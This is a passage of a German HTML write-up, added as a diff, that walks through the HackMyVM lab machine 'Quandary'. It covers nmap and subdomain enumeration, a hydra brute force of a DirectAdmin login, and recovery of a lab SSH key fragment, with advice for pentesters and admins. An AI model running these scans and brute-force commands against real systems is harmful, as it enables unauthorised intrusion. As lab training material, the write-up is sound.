@@ -1,0 +1,1038 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quandary - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Quandary - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl (implizit)</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">xxd</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">apt</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">pip</div>
+                <div class="tool-item">RsaCtfTool</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">hash-identifier</div>
+                <div class="tool-item">hashid</div>
+                <div class="tool-item">CyberChef (extern)</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">snap</div>
+                <div class="tool-item">whoami</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">chmod</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a>
+                    <ul>
+                        <li><a href="#web-enum-p80">Port 80 (Apache)</a></li>
+                        <li><a href="#web-enum-p8000">Port 8000 (Splunk)</a></li>
+                        <li><a href="#web-enum-p8089">Port 8089 (Splunk SSL)</a></li>
+                        <li><a href="#web-enum-subdomain">Subdomain Enumeration</a></li>
+                        <li><a href="#web-enum-directadmin">DirectAdmin Login</a></li>
+                    </ul>
+                </li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a>
+                    <ul>
+                        <li><a href="#privesc-lawrence">Enumeration als lawrence</a></li>
+                        <li><a href="#privesc-admin-creds">Admin Credentials</a></li>
+                        <li><a href="#privesc-splunk">Splunk Exploit (Implizit)</a></li>
+                        <li><a href="#privesc-admin-shell">Admin Shell & User Flag</a></li>
+                        <li><a href="#privesc-snap">Snap Exploit (Dirty Sock)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.126	08:00:27:92:e7:42	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Der `arp-scan -l` Befehl identifiziert aktive Hosts im lokalen Netzwerk. Ein Host mit der IP `192.168.2.126` und der MAC-Adresse `08:00:27:92:e7:42` wird gefunden. Der OUI (Organizationally Unique Identifier) `08:00:27` gehört zu "PCS Systemtechnik GmbH", was häufig auf eine VirtualBox-VM hinweist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Zielsystem wurde erfolgreich im lokalen Netzwerk lokalisiert. Die IP `192.168.2.126` wird für die weiteren Scans verwendet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die identifizierte IP `192.168.2.126` als Ziel für den Nmap-Portscan verwenden.<br>
+                **Empfehlung (Admin):** Netzwerk-Monitoring implementieren, um unbekannte oder unerwünschte Geräte im Netzwerk zu erkennen. Sicherstellen, dass nur autorisierte Systeme aktiv sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.126 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 14:55 CEST
+Nmap scan report for quandary (<span class="command">192.168.2.126</span>)
+Host is up (0.00015s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+<span class="command">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 81560bdc551faa606864239a9ff79cc7 (RSA)
+|   256 43f311c7e4bec9bf4f6c1b48f6e41368 (ECDSA)
+|_  256 3cb98d3f70b2311596f8ce952986b785 (ED25519)
+<span class="command">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span>
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Under Construction
+<span class="command">8000/tcp open  http     Splunkd httpd</span>
+|_http-server-header: Splunkd
+| http-robots.txt: 1 disallowed entry
+|_/
+| http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_Requested resource was http://quandary:8000/en-US/account/login?return_to=%2Fen-US%2F
+<span class="command">8089/tcp open  ssl/http Splunkd httpd</span>
+|_http-server-header: Splunkd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Not valid before: 2023-02-24T10:44:38
+|_Not valid after:  2026-02-23T10:44:38
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-title: splunkd
+MAC Address: <span class="command">08:00:27:92:E7:42</span> (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms quandary (<span class="command">192.168.2.126</span>)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ein umfassender Nmap-Scan (`-sS -sC -sV -T5 -A -p-`) auf `192.168.2.126` identifiziert die folgenden offenen TCP-Ports und Dienste:
+                *   **Port 22:** SSH (OpenSSH 8.2p1 auf Ubuntu). Ein Standard-Login-Dienst.
+                *   **Port 80:** HTTP (Apache 2.4.41 auf Ubuntu). Zeigt eine "Under Construction"-Seite an.
+                *   **Port 8000:** HTTP (Splunkd httpd). Der Titel deutet auf eine Login-Seite hin (`/en-US/account/login`). Die `robots.txt` verbietet das Crawlen des Root-Verzeichnisses (`/`).
+                *   **Port 8089:** HTTPS (SSL/HTTP, Splunkd httpd). Nutzt ein selbstsigniertes Zertifikat (`SplunkServerDefaultCert`). Ebenfalls eine `robots.txt` mit `Disallow: /`. Der Titel ist "splunkd".
+                Der Scan bestätigt das Betriebssystem als Linux (Ubuntu) und die VirtualBox-MAC-Adresse.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Mehrere interessante Angriffsvektoren:
+                *   **Port 80:** Standard-Webserver, aber anscheinend ohne viel Inhalt. Directory Brute-Forcing könnte dennoch nützlich sein. Der Hostname `quandary` wird im Nmap-Bericht erwähnt.
+                *   **Port 8000/8089 (Splunk):** Splunk ist eine weit verbreitete Plattform für Log-Management und Datenanalyse. Offene Splunk-Webinterfaces sind sehr interessante Ziele, da sie oft Konfigurationsmöglichkeiten bieten oder Schwachstellen aufweisen können, die zu Remote Code Execution führen. Port 8000 ist die Standard-Weboberfläche, Port 8089 die Management-Schnittstelle (oft für REST-API und Forwarder).
+                *   **Port 22:** Standard-SSH, erfordert gültige Anmeldeinformationen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  **Hosts-Datei:** Den Hostnamen `quandary.hmv` (aus späteren Befehlen ersichtlich) zur lokalen `/etc/hosts`-Datei hinzufügen und auf `192.168.2.126` zeigen lassen. Ebenso für `directadmin.quandary.hmv` (später gefunden).
+                2.  **Port 80:** Mit `gobuster` nach versteckten Verzeichnissen/Dateien suchen. Den E-Mail-Kontakt `admin@quandary.hmv` notieren (möglicherweise ein Benutzername?).
+                3.  **Port 8000/8089:** Die Splunk-Webinterfaces im Browser untersuchen. Nach Standard-Anmeldedaten suchen (z.B. `admin:changeme`), nach bekannten Schwachstellen für die spezifische Splunk-Version (falls ermittelbar) recherchieren. Die `robots.txt` ist hier wenig hilfreich. Zusätzliche Informationen aus den Anfragen extrahieren (wie später im Bericht gezeigt).
+                4.  **SSH:** Vorerst zurückstellen, bis Benutzernamen/Passwörter gefunden werden.<br>
+                **Empfehlung (Admin):**
+                1.  **Port 80:** Wenn die Seite "Under Construction" ist, sollte der Webserver idealerweise deaktiviert oder der Zugriff stark eingeschränkt werden.
+                2.  **Splunk (Port 8000/8089):** Den Zugriff auf die Splunk-Weboberfläche und die Management-Schnittstelle auf autorisierte Benutzer und Netzwerke beschränken (Firewall, Splunk-eigene Zugriffskontrollen). Starke, nicht-standardmäßige Passwörter verwenden. Splunk aktuell halten (Patches!). Das selbstsignierte Zertifikat auf Port 8089 durch ein vertrauenswürdiges Zertifikat ersetzen.
+                3.  **SSH:** Standard-Härtungsempfehlungen (starke Passwörter/Keys, Fail2ban, Zugriffsbeschränkung).
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <h3 id="web-enum-p80">Port 80 (Apache)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://quandary.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://quandary.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,txt,php,rar,zip,tar,pub,xls,docx,doc
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2023/04/12 15:05:35 Starting gobuster in directory enumeration mode
+===============================================================
+/<span class="command">index.html</span>           (Status: 200) [Size: 685]
+
+===============================================================
+2023/04/12 15:06:18 Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver unter `http://quandary.hmv` (Port 80) zu finden. Es verwendet eine mittelgroße Wortliste und sucht nach einer Vielzahl von Dateiendungen. Statuscodes 403 und 404 werden ignoriert.
+                 Das einzige gefundene Ergebnis ist die Datei `index.html` mit Statuscode 200 und einer Größe von 685 Bytes.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Der Webserver auf Port 80 scheint tatsächlich nur die Standard-Indexseite ("Under Construction") zu enthalten. `gobuster` konnte keine weiteren versteckten Verzeichnisse oder Dateien aufdecken.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Den Inhalt der `index.html` untersuchen (obwohl er wahrscheinlich nur den "Under Construction"-Text enthält). Nach weiteren Informationen im Quellcode oder in HTTP-Headern suchen. Da hier nichts weiter gefunden wurde, den Fokus auf die anderen Ports (Splunk) legen.<br>
+                 **Empfehlung (Admin):** Wie bereits erwähnt, sollte ein nicht genutzter Webserver idealerweise deaktiviert werden.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Manuelle Analyse der index.html -->
+                     <pre>
+<h1>Under Construction</h1>
+<p>We apologize for the inconvenience, but this website is currently under construction.</p>
+<p>Please check back soon for updates! Please contact <span class="command">admin@quandary.hmv</span> for more information!</p>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der relevante HTML-Code der `index.html`-Seite wird gezeigt. Er enthält den "Under Construction"-Text und eine Kontakt-E-Mail-Adresse: `admin@quandary.hmv`.
+             </p>
+              <p class="evaluation">
+                 **Bewertung:** Bestätigt den Inhalt der Seite. Die E-Mail-Adresse `admin@quandary.hmv` könnte ein gültiger Benutzername (`admin`) für andere Dienste (SSH, Splunk, DirectAdmin) sein.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Den Benutzernamen `admin` für Brute-Force-Angriffe oder Login-Versuche auf den anderen gefundenen Diensten vormerken.<br>
+                 **Empfehlung (Admin):** Vermeiden, interne E-Mail-Adressen oder potenzielle Benutzernamen auf öffentlich zugänglichen "Under Construction"-Seiten preiszugeben.
+             </p>
+
+            <h3 id="web-enum-p8000">Port 8000 (Splunk)</h3>
+             <p class="analysis">
+                **Analyse:** Im Nmap-Scan wurde Port 8000 als Splunkd HTTP-Dienst identifiziert. Die `robots.txt` verbietet das Crawlen, und der Titel deutet auf eine Login-Seite. Zusätzliche manuelle Untersuchung (nicht im Log detailliert) ergab weitere Hinweise:
+                *   Ein Cookie `session_id_8000` wird gesetzt.
+                *   Eine Anforderung an `/de-DE/i18ncatalog?...` liefert Text, der das Splunk-Spool-Verzeichnis `$SPLUNK_HOME/var/spool/splunk` erwähnt.
+                *   Ein weiterer Text-Schnipsel enthält `"password": "Remote-Passwort"`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Diese manuell extrahierten Informationen sind wertvoll:
+                *   Die Erwähnung des Spool-Verzeichnisses gibt einen Hinweis auf die interne Struktur von Splunk.
+                *   Der Schnipsel `"password": "Remote-Passwort"` ist höchst verdächtig. Es könnte sich um ein schlecht maskiertes Passwort, einen Platzhalter oder einen Hinweis handeln. "Remote-Passwort" sollte als potenzielles Passwort für Benutzer wie `admin` getestet werden.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Das potenzielle Passwort "Remote-Passwort" für den Benutzer `admin` (aus der index.html) auf der Splunk-Login-Seite (Port 8000) und ggf. anderen Diensten (SSH, DirectAdmin) testen. Die Splunk-Oberfläche weiter untersuchen, falls ein Login gelingt.<br>
+                **Empfehlung (Admin):** Sicherstellen, dass keine sensiblen Informationen wie Verzeichnispfade oder Passwort-Hinweise in öffentlich zugänglichen Katalogdateien oder API-Antworten preisgegeben werden. Den Ursprung des `"password": "Remote-Passwort"`-Schnipsels finden und bereinigen.
+            </p>
+
+
+            <h3 id="web-enum-p8089">Port 8089 (Splunk SSL)</h3>
+             <p class="analysis">
+                **Analyse:** Nmap identifizierte Port 8089 als Splunkd HTTPS-Dienst mit einem selbstsignierten Zertifikat. Der Titel ist "splunkd". Manuelle Untersuchung der URL `https://quandary.hmv:8089/` (nicht im Log detailliert) ergab eine Splunk-Build-Version: `7.1.9`. Zudem wurden Verzeichnispfade wie `/services`, `/servicesNS`, `/static` und `/rpc` beobachtet, die typisch für die Splunk-REST-API sind.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die Kenntnis der Splunk-Version `7.1.9` ist sehr nützlich. Man kann nun gezielt nach bekannten Schwachstellen und Exploits für diese Version suchen. Die Pfade bestätigen, dass dies wahrscheinlich die Management-/API-Schnittstelle ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nach bekannten Exploits für Splunk 7.1.9 suchen (z.B. in Exploit-DB, GitHub). Prüfen, ob die REST-API anonym oder mit Standard-/gefundenen Anmeldeinformationen zugänglich ist und ob darüber Aktionen ausgeführt werden können.<br>
+                **Empfehlung (Admin):** Splunk auf die neueste Version aktualisieren, um bekannte Schwachstellen zu schließen. Den Zugriff auf die Management-Schnittstelle (Port 8089) stark einschränken (Firewall, IP-Whitelisting).
+            </p>
+
+            <h3 id="web-enum-subdomain">Subdomain Enumeration</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u quandary.hmv -H "Host: FUZZ.quandary.hmv" --hh 685</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://quandary.hmv/
+Total requests: 109682
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000106244:   200        118 L    229 W      2230 Ch     "directadmin"</span>
+
+Total time: 65.33127s
+Processed Requests: 109682
+Filtered Requests: 109681
+Requests/sec.: 1678.887
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `wfuzz` wird verwendet, um nach Subdomains von `quandary.hmv` zu suchen.
+                *   `-c`: Farbige Ausgabe.
+                *   `-w ...`: Wortliste mit potenziellen Subdomain-Namen.
+                *   `-u quandary.hmv`: Basis-URL (hier etwas irreführend, da der Host-Header manipuliert wird).
+                *   `-H "Host: FUZZ.quandary.hmv"`: Der entscheidende Teil. `wfuzz` ersetzt `FUZZ` durch Einträge aus der Wortliste und sendet Anfragen mit diesem manipulierten Host-Header an die IP von `quandary.hmv`.
+                *   `--hh 685`: Versteckt Antworten mit 685 Zeichen (die Größe der "Under Construction"-Seite auf der Hauptdomain), um nur abweichende Ergebnisse (potenzielle virtuelle Hosts) anzuzeigen.
+                Das Ergebnis zeigt, dass eine Anfrage mit dem Host-Header `directadmin.quandary.hmv` eine Antwort mit Statuscode 200 und einer anderen Größe (2230 Chars) liefert.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Erfolg! Eine Subdomain (oder genauer gesagt ein virtueller Host, der auf denselben Apache-Server reagiert) namens `directadmin.quandary.hmv` wurde gefunden. DirectAdmin ist eine verbreitete Webhosting-Control-Panel-Software. Dies eröffnet einen neuen Angriffsvektor.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  Die Subdomain `directadmin.quandary.hmv` zur lokalen `/etc/hosts`-Datei hinzufügen (auf `192.168.2.126` zeigend).
+                2.  Die Seite `http://directadmin.quandary.hmv` im Browser aufrufen und untersuchen.
+                3.  Nach Login-Möglichkeiten suchen und versuchen, die zuvor gefundenen Anmeldeinformationen (`admin:Remote-Passwort` oder `admin` mit Brute-Force) zu verwenden.<br>
+                **Empfehlung (Admin):** Virtuelle Hosts und Subdomains sollten nur dann konfiguriert werden, wenn sie benötigt werden. Den Zugriff auf Admin-Panels wie DirectAdmin auf autorisierte IPs beschränken. Software aktuell halten und starke Passwörter verwenden.
+            </p>
+
+            <h3 id="web-enum-directadmin">DirectAdmin Login</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l admin -P /usr/share/wordlists/rockyou.txt directadmin.quandary.hmv http-post-form '/login.php:uname=^USER^&psw=^PASS^:Incorrect username or password.'</span></div>
+                     <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344413 login tries (l:1/p:14344413), ~896526 tries per task
+[DATA] attacking http-post-form://directadmin.quandary.hmv:80/login.php:uname=^USER^&psw=^PASS^:Incorrect username or password.
+<span class="password">[80][http-post-form] host: directadmin.quandary.hmv   login: admin   password: qazxsw</span>
+
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker thread(s) are still running. You can safely abort this external command.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-12 15:56:42
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** `hydra` wird für einen Brute-Force-Angriff auf das Login-Formular von `directadmin.quandary.hmv` verwendet.
+                 *   `-l admin`: Versucht den Login für den Benutzer `admin`.
+                 *   `-P /usr/share/wordlists/rockyou.txt`: Verwendet die `rockyou.txt`-Liste als Passwortquelle.
+                 *   `directadmin.quandary.hmv`: Das Zielsystem.
+                 *   `http-post-form`: Gibt das Angriffsprotokoll an.
+                 *   `'/login.php:uname=^USER^&psw=^PASS^:Incorrect username or password.'`: Definiert die Login-URL (`/login.php`), die Parameter für Benutzername (`uname=^USER^`) und Passwort (`psw=^PASS^`), und die Fehlermeldung (`Incorrect username or password.`), die bei einem fehlgeschlagenen Versuch erwartet wird.
+                 Hydra findet erfolgreich das Passwort `qazxsw` für den Benutzer `admin`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Ein schwaches Passwort (`qazxsw`) für den `admin`-Account des DirectAdmin-Panels wurde gefunden. Dies ermöglicht den Login in das Control Panel und potenziell weitere Aktionen, abhängig von den Berechtigungen des `admin`-Benutzers innerhalb von DirectAdmin.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Sich mit den gefundenen Anmeldeinformationen (`admin:qazxsw`) bei `http://directadmin.quandary.hmv` anmelden. Das Dashboard und alle verfügbaren Funktionen erkunden. Nach Möglichkeiten suchen, Dateien hochzuladen, Code auszuführen, Konfigurationen zu ändern oder sensible Informationen (wie SSH-Schlüssel) einzusehen.<br>
+                 **Empfehlung (Admin):** Starke, einzigartige Passwörter für alle Admin-Konten verwenden. Brute-Force-Schutzmechanismen implementieren (z.B. Fail2ban, Account-Sperrung nach fehlgeschlagenen Versuchen). Zwei-Faktor-Authentifizierung (2FA) aktivieren, falls von DirectAdmin unterstützt.
+             </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis">
+                **Analyse:** Nach dem Login in das DirectAdmin-Panel (`http://directadmin.quandary.hmv/dashboard.php`) mit `admin:qazxsw` wurde der folgende Text im Dashboard gefunden. Er enthält einen unvollständigen privaten SSH-Schlüssel und eine Nachricht.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Inhalt aus DirectAdmin Dashboard -->
+                     <pre>
+Dashboard
+
+Welcome to the admin dashboard! Here you can manage your website and view important data.
+
+<span class="password">zfWP0ewz87090bqRvmdyw5HvVznmhQAAAMEA3bbbBmTDBn4E/86brUv/b3nBhMiR1bbx nIEKyhulHY5mf3KcneltIzfJDRdg/pmjCcGTkAkHc0BN9bLy6d2gQLlsw9PY/tbXuVp69 LIxDbA4UfeS+/CTrpREVj+rBU1R6DJvJ5pnWSIx+pWEc6M9Ysfi4PQtJgGINxd5BEwyX/g yHu5gjadvjsUYTpSGq+pEE44tHhAcrrx81F/J2iKYyyJ9iAxvlqPHWL6mhum1W4ofiWDJ C+4pw4gKwfuX5AAAAEWxhd3JlbmNlQHF1YW5kYXJ5AQ -----END PENSSH PRIVATE KEY-----</span>
+
+<span class="password">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMkW1dygI8UCwrEjjCnceqjY2Dnw6kUtCs4KAId5f/xeKjx6hsC9kvm0u/Rs/TiLhqQm+ibpo/EVZ4vvw8XcrEqTdrU60PiZ+RRUVHdps+SlLAys/h+jopRfEvfeE4G86Kzm0pNwPoiny9ruLDa3ByPjhe3x9Rx9Vb+2KxZtXkEWeC1G8xILp5jG5gwboe6ncRtvTvko31iZCXG4eEAf04tdCitmF11KDoLgnmWsAmGIZoUDGaoydNUEMi2cGiaUizvAIvAbUXoZLRcuVyPv8eHL+hpmk/xPa4hN6z510EBbfiBEgTj12pu1SMQ1E5DsS/d7n+UxEeM0M1ooVic85ttXAY4VzThX/2c6b7o9iPtZ2QtyvFnV2Fb8RgclN3rrk7sLrw6t4YzxyyLLKGviLDEXssPJ7QSQmbA5kEFTTj8ATg2l+VqKbqljvbslTj/KzJiiycUg5RfHMmi7/gAEI9DMIcCNgYy2CKDv/1K94VYFBKT5nAsMF0= lawrence@quandary</span>
+Just wanted to let you know that the other day I told you to leave me your public and private key in here. You only copied the public key and I believe that your private key was not copied completely to your clipboard. Anyways send me an email at admin@quandary.hmv when you have copied your private key here. Talk to you next week!
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                **Bewertung:** Das ist ein entscheidender Fund!
+                *   Ein öffentlicher SSH-Schlüssel für den Benutzer `lawrence@quandary` ist vollständig vorhanden.
+                *   Ein privater SSH-Schlüssel (vermutlich der zugehörige für `lawrence`) ist nur als Fragment vorhanden (`zfWP...`). Die Kopf- und Fußzeilen (`-----BEGIN/END OPENSSH PRIVATE KEY-----`) fehlen teilweise, und der Base64-kodierte Teil ist unvollständig.
+                *   Die Nachricht bestätigt, dass der private Schlüssel unvollständig ist und deutet darauf hin, dass `lawrence` der Besitzer dieses Schlüssels ist.
+                Die Herausforderung besteht nun darin, den vollständigen privaten Schlüssel zu rekonstruieren, um sich als `lawrence` per SSH anzumelden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  Den öffentlichen Schlüssel (`id_rsa.pub`) und das Fragment des privaten Schlüssels (`id_rsa`) in separate Dateien speichern.
+                2.  Versuchen, den privaten Schlüssel zu reparieren/rekonstruieren. Da der öffentliche Schlüssel bekannt ist (enthält Modulus `n` und Exponent `e`), und das Fragment Teile des privaten Schlüssels (möglicherweise Teile von `d`, `p`, `q`) enthält, könnten Tools wie `RsaCtfTool` oder manuelle Kryptoanalyse helfen. Die Base64-Kodierung des Fragments muss möglicherweise repariert werden (z.B. durch Hinzufügen von Padding oder Korrektur von Zeilenumbrüchen), bevor sie dekodiert werden kann. Die Fehlermeldung `base64: ungültige Eingabe` deutet auf solche Probleme hin.<br>
+                **Empfehlung (Admin):** Niemals private Schlüssel (auch keine Fragmente) in Web-Dashboards oder anderen unsicheren Orten speichern. Benutzer über den sicheren Umgang mit SSH-Schlüsseln aufklären. DirectAdmin-Instanz auf weitere Schwachstellen oder Fehlkonfigurationen prüfen, die diesen Fund ermöglichten.
+            </p>
+
+            <p class="analysis">
+                **Analyse:** Die folgenden Schritte zeigen die Versuche des Pentesters, das gefundene private Schlüssel-Fragment zu verarbeiten und zu rekonstruieren.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nano id_rsa</span></div>
+                     <!-- Speichern des Fragments -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nano id_rsa.pub</span></div>
+                     <!-- Speichern des öffentlichen Keys -->
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Das Schlüssel-Fragment wird in `id_rsa` und der öffentliche Schlüssel in `id_rsa.pub` gespeichert.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">base64 -d id_rsa | xxd -seek 29 -l 193 -p > ssh_magic</span></div>
+                    <pre>
+<span class="password">base64: ungültige Eingabe</span>
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">base64 -d id_rsa | xxd -seek 29 -l 193 -p > ssh_magic</span></div>
+                     <pre>
+<span class="password">base64: ungültige Eingabe</span>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Es wird versucht, das Base64-kodierte Fragment zu dekodieren (`base64 -d`) und dann mit `xxd` einen bestimmten Teil (Länge 193 Bytes ab Offset 29) als Hex-String (`-p`) zu extrahieren und in die Datei `ssh_magic` zu schreiben. Beide Versuche scheitern mit `base64: ungültige Eingabe`.
+             </p>
+             <p class="evaluation">
